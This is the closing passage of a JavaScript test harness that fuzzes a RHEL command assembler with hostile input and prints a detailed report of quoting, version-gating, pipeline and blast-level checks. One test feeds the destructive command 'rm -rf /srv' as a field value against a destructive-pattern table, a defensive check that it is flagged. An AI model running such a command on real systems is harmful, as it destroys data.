  if (A.shQuote("plain") !== "'plain'") inv.push("shQuote() has a bare-value bypass — quoting must be uniform");

  /* a required field left empty must yield null on every version */
  for (var iv = 0; iv < VERSIONS.length; iv++) {
    var emptySpec = flagSpec("zone", fx.field_types.zone);
    if (A.assembleCommand(emptySpec, VERSIONS[iv], {}, { patterns: [] }) !== null) {
      inv.push("a missing required field produced a command on RHEL " + VERSIONS[iv]);
    }
  }
  /* a field gated out of a version can never appear in that version's command */
  var gated = flagSpec("zone", fx.field_types.zone, ["9", "10"]);
  gated.fields[0].required = false;
  for (var gv = 0; gv < VERSIONS.length; gv++) {
    var g = A.assembleCommand(gated, VERSIONS[gv], { v: "public" }, { patterns: [] });
    var present = g !== null && g.command.indexOf("public") >= 0;
    var allowed = VERSIONS[gv] === "9" || VERSIONS[gv] === "10";
    if (present !== allowed) {
      inv.push("version gating wrong on RHEL " + VERSIONS[gv] + ": value " +
               (present ? "reached" : "did not reach") + " the command");
    }
  }
  /* an enum option gated out of a version cannot be selected on that version */
  var optSpec = flagSpec("enum", { benign: "alpha", options: [{ value: "alpha", versions: VERSIONS },
                                                              { value: "bravo", versions: ["10"] }] });
  for (var ov = 0; ov < VERSIONS.length; ov++) {
    var o = A.assembleCommand(optSpec, VERSIONS[ov], { v: "bravo" }, { patterns: [] });
    if ((o !== null) !== (VERSIONS[ov] === "10")) {
      inv.push("a version-gated enum option was selectable on RHEL " + VERSIONS[ov]);
    }
  }
  /* blast: the destructive table is matched post-assembly, and blast:red stands alone */
  var dz = flagSpec("comment", fx.field_types.comment);
  var red = A.assembleCommand(dz, "9", { v: "rm -rf /srv" },
                              { patterns: [{ id: "dp", match: "rm -rf", label: "l", why: "w", blast_floor: "red" }] });
  if (!red || red.blast !== "red") inv.push("a destructive pattern in the assembled command did not raise blast to red");
  var ownRed = A.assembleCommand({ id: "x", blast: "red", fields: [], template: [{ lit: "true" }] }, "9", {}, { patterns: [] });
  if (!ownRed || ownRed.blast !== "red") inv.push("a content entry's own blast:red did not survive assembly");

  for (var q = 0; q < inv.length; q++) stats.failures.push("invariant: " + inv[q]);

  var report = {
    target: path.relative(REPO, target),
    assembler_bytes: loaded.bytes,
    field_types: types.length,
    vectors: vectors.length,
    versions: VERSIONS.length,
    checks: stats.checks,
    rejected: stats.rejected,
    quoted_safe: stats.quoted,
    rich_rule_oracles: stats.oracles,
    half_formed_checks: halfFormed,
    clipboard_checks: clipboardChecks,
    token_allow_list_checks: tokenChecks,
    destructive_pattern_checks: patternChecks,
    content_spec_checks: contentSpecChecks,
    content_spec_entries: specEntries.length,
    golden_command_checks: goldenChecks,
    option_syntax_checks: syntaxChecks,
    flag_join_checks: joinChecks,
    discriminator_checks: discChecks,
    field_grammar_checks: grammarChecks,
    enum_branch_checks: branchChecks,
    inspector_flag_checks: inspectorChecks,
    pipeline_checks: pipeChecks,
    pipeline_rejected: pipeRejected,
    pipeline_composed: pipeComposed,
    pipeline_oracles: pipeOracles,
    pipeline_operator_seam_checks: opSeamChecks,
    pipeline_operator_controls: opKeyControls,
    pipeline_table_checks: tableChecks,
    pipeline_blast_checks: blastChecks,
    pipeline_refusal_checks: refusalChecks,
    pipeline_negative_controls: pipeNegatives,
    pipeline_stig_shape_checks: stigShapeChecks,
    pipeline_interpreter_class_checks: interpreterChecks,
    pipeline_stage_naming_checks: namingChecks,
    one_stage_invariants: oneStageInvariants,
    rich_rule_slot_types_refused: richCounts.refusedType,
    rich_rule_slot_types_allowed: richCounts.allowedType,
    positive_controls: controls,
    /* shQuote idiom and uniformity (2) + the MCR-SEC-010 no-YAML-quoter guard
       (1) + empty-required, version gating and gated enums (3 per release)
       + 2 tokeniser negative controls + 2 rich-rule-oracle negative controls
       + 2 blast invariants + the MCR-SEC-001 regression (1 vector check + 1 per
       release + 1 typed) */
    invariants: 2 + 1 + VERSIONS.length * 3 + 2 + 2 + 2 + (2 + VERSIONS.length) + 3,
    failures: stats.failures
  };
  if (asJson) {
    process.stdout.write(JSON.stringify(report, null, 1) + "\n");
  } else {
    console.log("hostile-input harness — " + report.target + " (" + loaded.bytes + " bytes of assembler)");
    console.log("  " + types.length + " field types x " + vectors.length + " vectors x " +
                VERSIONS.length + " releases x 3 argument shapes, plus two rich-rule shapes with " +
                "every field type substituted into every slot");
    console.log("  " + stats.checks + " checks: " + stats.rejected + " rejected (null), " +
                stats.quoted + " quoted-safe, " + stats.failures.length + " FAILED");
    console.log("  rich-rule: " + report.rich_rule_slot_types_refused + " slot/type pairs refused " +
                "structurally, " + report.rich_rule_slot_types_allowed + " allow-listed and composed, " +
                stats.oracles + " compositions parsed and compared element-for-element to the " +
                "operator's intent");
    console.log("  " + halfFormed + " never-half-formed checks (absent optional field across every " +
                "template shape, all four releases)");
    console.log("  " + clipboardChecks + " clipboard-payload checks: every line '# '-prefixed except " +
                "the command, no control character survives, blast sees the whole payload");
    console.log("  " + tokenChecks + " flag/lit allow-list checks and " + patternChecks +
                " destructive-pattern checks (every row of content/dangerous.json fires on a " +
                "synthetic assembled command)");
    console.log("  " + contentSpecChecks + " content-spec checks: every field of every one of the " +
                specEntries.length + " REAL generator entries in content/commands.json (CR-T-17..25), " +
                "fuzzed with the same hostile vector set in its own template, not a synthetic analog");
    console.log("  " + goldenChecks + " golden-command checks (VALIDITY oracle: the exact command " +
                "every generator must emit, per release, hand-authored from the man pages in " +
                "tests/fixtures/golden-commands.json) and " + syntaxChecks + " getopt(3) option-syntax " +
                "checks (no short option joined with '='; every long option keeps its '=')");
    console.log("  " + joinChecks + " derived-join checks: the join is computed from the flag's " +
                "shape, and a token declaring a join its shape derives is null on every release");
    console.log("  " + discChecks + " derived-discriminator checks (an option-shaped lit is an " +
                "OPTION and never an argument slot; a token carrying both lit and flag is refused) " +
                "and " + inspectorChecks + " inspector flag-list checks (MCR-SEC-023: the panel " +
                "names every option the command shows, and no option it does not)");
    console.log("  " + grammarChecks + " closed-grammar checks (MCR-SEC-016: lvm_size and " +
                "group_list, with the '+10G' grow form accepted and a free-text LVM size refused " +
                "on the real generator)");
    console.log("  " + branchChecks + " enum-branch control checks (MCR-SEC-021: every option of " +
                "every enum field of every generator on every release, asserted for validity and " +
                "for blast — a destructive branch must come out at least yellow, and a green " +
                "generator must still have a green branch)");
    console.log("  " + pipeChecks + " PIPELINE checks (CR-T-31): every hostile vector into every " +
                "field of every stage of 2- and 3-stage pipelines, and into every redirect target " +
                "-- " + pipeRejected + " rejected (null), " + pipeComposed + " composed and " +
                "confined");
    console.log("  " + report.pipeline_operator_seam_checks + " operator-seam checks (every " +
                "hostile vector, every prototype-chain key and the operator TEXT itself driven " +
                "into `op`: an operator is a KEY into a closed table, never data) and " +
                report.pipeline_operator_controls + " controls proving the ten real keys compose");
    console.log("  " + pipeOracles + " PIPELINE ORACLE comparisons (the emitted line tokenised and " +
                "every operator's identity AND word index compared to the composition, with no " +
                "other word allowed to be an operator or to leave a metacharacter unquoted), " +
                pipeNegatives + " oracle negative controls, " + report.pipeline_table_checks +
                " operator-table integrity checks");
    console.log("  " + report.pipeline_blast_checks + " blast-composition checks (a redirect " +
                "outside scratch is a WRITE, a system-path target is RED, xargs feeding a " +
                "destructive tool is RED, ; && || carry the max, and dangerous.json fires across " +
                "an operator on the de-quoted WHOLE pipeline) and " +
                report.pipeline_refusal_checks + " refusal checks, each with its legal neighbour " +
                "as a control");
    console.log("  " + report.pipeline_interpreter_class_checks + " interpreter-class checks " +
                "(PL2: rule 4 as a CLASS -- a pipe into an interpreter, an xargs child that is " +
                "one, and an execution sink reached by REDIRECT -- plus TM2-F8's wrapper refusals " +
                "and the sed/awk controls that prove the class is not \"refuse anything powerful\")");
    console.log("  " + report.pipeline_stage_naming_checks + " stage-naming checks (PL6: every " +
                "incomplete pipeline is null AND validatePipeline() names the one stage that is " +
                "wrong, never all of them)");
    console.log("  " + oneStageInvariants + " one-stage invariants: a pipeline of one stage is " +
                "assembleCommand(), byte for byte, on every generator and every release");
    console.log("  " + report.pipeline_stig_shape_checks + " STIG-corpus shape checks (ADR-002: " +
                "the closed set must express the pipelines DISA's own check text uses)");
    console.log("  " + controls + " positive controls (benign value per type/release/shape) and " +
                report.invariants + " invariants");
    var classes = Object.keys(stats.byClass).sort();
    for (var c = 0; c < classes.length; c++) {
      console.log("    " + classes[c] + ": " + stats.byClass[classes[c]].rejected + " rejected, " +
                  stats.byClass[classes[c]].quoted + " quoted-safe");
    }
    for (var ff = 0; ff < stats.failures.length; ff++) console.log("  FAIL: " + stats.failures[ff]);
  }
  process.exit(stats.failures.length ? 1 : 0);
}

/* Run as a CLI (`node tests/hostile_harness.js`) exactly as before. Required as
   a module, export the pieces tests/shift_crosscheck_driver.js needs, so the
   exhaustive shift cross-check (MCR-SEC-018, condition E3) lifts the SAME
   assembler through the SAME purity-checked extractor rather than growing a
   second copy of it. */
if (require.main === module) {
  main();
} else {
  module.exports = { extractAssembler: extractAssembler, tokenize: tokenize,
                     skeleton: skeleton, optionSyntaxErrors: optionSyntaxErrors };
}
